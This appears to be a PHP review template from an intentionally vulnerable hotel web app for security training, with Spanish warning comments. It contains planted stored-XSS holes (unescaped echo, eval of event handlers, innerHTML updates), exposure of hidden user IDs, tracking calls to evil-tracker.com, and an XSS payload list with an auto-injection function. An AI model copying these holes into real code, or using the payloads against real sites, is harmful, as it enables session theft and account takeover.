<!-- ⚠️ ELEMENTO DE RESEÑA CON XSS ALMACENADO -->
<div class="review-item" data-review-id="<?php echo $review['id']; ?>">
    <!-- ⚠️ XSS en nombre de usuario -->
    <h4 class="review-author"><?php echo $review['username']; ?></h4>
    
    <div class="review-rating">
        <?php echo str_repeat('★', $review['rating']); ?>
        <span class="review-date"><?php echo $review['created_at']; ?></span>
    </div>
    
    <!-- ⚠️ XSS almacenado en contenido -->
    <div class="review-content">
        <?php echo $review['content']; ?>
    </div>
    
    <!-- ⚠️ Información oculta -->
    <div class="review-meta" style="display: none;">
        <p>Review ID: <?php echo $review['id']; ?></p>
        <p>User ID: <?php echo $review['user_id']; ?></p>
        <p>Hotel ID: <?php echo $review['hotel_id']; ?></p>
    </div>
    
    <!-- ⚠️ Acciones peligrosas -->
    <div class="review-actions">
        <?php if (isset($_SESSION['user_id']) && $_SESSION['user_id'] == $review['user_id']): ?>
            <button class="btn-edit-review">Edit</button>
            <button class="btn-delete-review">Delete</button>
        <?php endif; ?>
        
        <?php if (isset($_SESSION['is_admin']) && $_SESSION['is_admin']): ?>
            <button class="btn-admin-delete" style="background: #dc3545;">Admin Delete</button>
            <button class="btn-view-user" style="background: #6c757d;">View User</button>
        <?php endif; ?>
    </div>
    
    <!-- ⚠️ Formulario de edición (oculto) -->
    <div class="edit-review-form" style="display: none;">
        <textarea class="edit-review-content" rows="3"><?php echo htmlspecialchars($review['content']); ?></textarea>
        <button class="btn-save-edit">Save</button>
        <button class="btn-cancel-edit">Cancel</button>
    </div>
</div>

<style>
    .review-item {
        border: 1px solid #ddd;
        border-radius: 8px;
        padding: 15px;
        margin: 10px 0;
        background: #f8f9fa;
    }
    
    .review-author {
        color: #007bff;
        margin: 0 0 5px 0;
    }
    
    .review-rating {
        color: #ffc107;
        margin-bottom: 10px;
    }
    
    .review-date {
        color: #6c757d;
        font-size: 12px;
        margin-left: 10px;
    }
    
    .review-content {
        color: #333;
        margin: 10px 0;
        padding: 10px;
        background: white;
        border-radius: 4px;
        border-left: 3px solid #007bff;
    }
    
    .review-actions button {
        padding: 5px 10px;
        margin-right: 5px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 12px;
    }
    
    .edit-review-form textarea {
        width: 100%;
        padding: 8px;
        border: 1px solid #ddd;
        border-radius: 4px;
        margin-bottom: 10px;
    }
</style>

<script>
    // ⚠️ Manejo de reseñas en el cliente
    document.addEventListener('DOMContentLoaded', function() {
        // Ejecuta JavaScript en contenido de reseñas
        document.querySelectorAll('.review-content').forEach(div => {
            const scripts = div.querySelectorAll('script');
            scripts.forEach(script => {
                try {
                    // ⚠️ Crea y ejecuta el script
                    const newScript = document.createElement('script');
                    newScript.textContent = script.textContent;
                    document.body.appendChild(newScript);
                    script.remove(); // Elimina el original
                } catch(e) {
                    console.error('Error executing review script:', e);
                }
            });
            
            // ⚠️ También busca event handlers
            const elementsWithEvents = div.querySelectorAll('[onclick],[onload],[onerror]');
            elementsWithEvents.forEach(el => {
                const events = ['click', 'load', 'error'];
                events.forEach(event => {
                    const handler = el.getAttribute('on' + event);
                    if (handler) {
                        el.addEventListener(event, function() {
                            try {
                                eval(handler);
                            } catch(e) {
                                console.error('Error executing event handler:', e);
                            }
                        });
                        el.removeAttribute('on' + event);
                    }
                });
            });
        });
        
        // Botón de editar reseña
        document.querySelectorAll('.btn-edit-review').forEach(btn => {
            btn.addEventListener('click', function() {
                const reviewItem = this.closest('.review-item');
                const content = reviewItem.querySelector('.review-content');
                const editForm = reviewItem.querySelector('.edit-review-form');
                
                content.style.display = 'none';
                editForm.style.display = 'block';
            });
        });
        
        // Guardar edición
        document.querySelectorAll('.btn-save-edit').forEach(btn => {
            btn.addEventListener('click', function() {
                const reviewItem = this.closest('.review-item');
                const reviewId = reviewItem.dataset.reviewId;
                const newContent = reviewItem.querySelector('.edit-review-content').value;
                const contentDiv = reviewItem.querySelector('.review-content');
                
                // ⚠️ Actualiza sin sanitizar
                contentDiv.innerHTML = newContent;
                contentDiv.style.display = 'block';
                reviewItem.querySelector('.edit-review-form').style.display = 'none';
                
                // ⚠️ Envía al servidor
                fetch('../api/reviews.php', {
                    method: 'PUT',
                    body: JSON.stringify({
                        id: reviewId,
                        content: newContent
                    })
                });
            });
        });
        
        // Eliminar reseña
        document.querySelectorAll('.btn-delete-review, .btn-admin-delete').forEach(btn => {
            btn.addEventListener('click', function() {
                const reviewItem = this.closest('.review-item');
                const reviewId = reviewItem.dataset.reviewId;
                
                if (confirm('Delete this review?')) {
                    fetch('../api/reviews.php?action=delete&id=' + reviewId, {
                        method: 'DELETE'
                    })
                    .then(() => reviewItem.remove());
                }
            });
        });
        
        // Ver usuario (admin)
        document.querySelectorAll('.btn-view-user').forEach(btn => {
            btn.addEventListener('click', function() {
                const reviewItem = this.closest('.review-item');
                const userId = reviewItem.querySelector('.review-meta p:nth-child(2)').textContent.replace('User ID: ', '');
                
                // ⚠️ BOLA: Carga perfil de cualquier usuario
                window.location.href = '?page=profile&id=' + userId;
            });
        });
        
        // ⚠️ Captura interacciones con reseñas
        document.querySelectorAll('.review-item').forEach(item => {
            item.addEventListener('mouseenter', function() {
                const reviewId = this.dataset.reviewId;
                
                fetch('https://evil-tracker.com/review-hover', {
                    method: 'POST',
                    body: JSON.stringify({
                        review_id: reviewId,
                        action: 'hover',
                        timestamp: new Date().toISOString()
                    })
                });
            });
            
            item.addEventListener('click', function(e) {
                if (e.target.tagName !== 'BUTTON') {
                    const reviewId = this.dataset.reviewId;
                    
                    fetch('https://evil-tracker.com/review-click', {
                        method: 'POST',
                        body: JSON.stringify({
                            review_id: reviewId,
                            action: 'click',
                            timestamp: new Date().toISOString()
                        })
                    });
                }
            });
        });
    });
    
    // ⚠️ Función para inyectar reseñas maliciosas
    function injectMaliciousReview(hotelId, payload) {
        const reviewData = {
            hotel_id: hotelId,
            content: payload,
            rating: 5,
            user_id: <?php echo $_SESSION['user_id'] ?? 1; ?>
        };
        
        fetch('../api/reviews.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(reviewData)
        })
        .then(() => {
            alert('Malicious review injected!');
            location.reload();
        });
    }
    
    // ⚠️ Ejemplos de payloads XSS para reseñas
    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(document.cookie)">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg/onload="alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">'
    ];
    
    // ⚠️ Función para probar payloads
    function testXSSPayloads(hotelId) {
        xssPayloads.forEach((payload, index) => {
            setTimeout(() => {
                injectMaliciousReview(hotelId, 'Test ' + (index + 1) + ': ' + payload);
            }, index * 2000);
        });
    }
</script>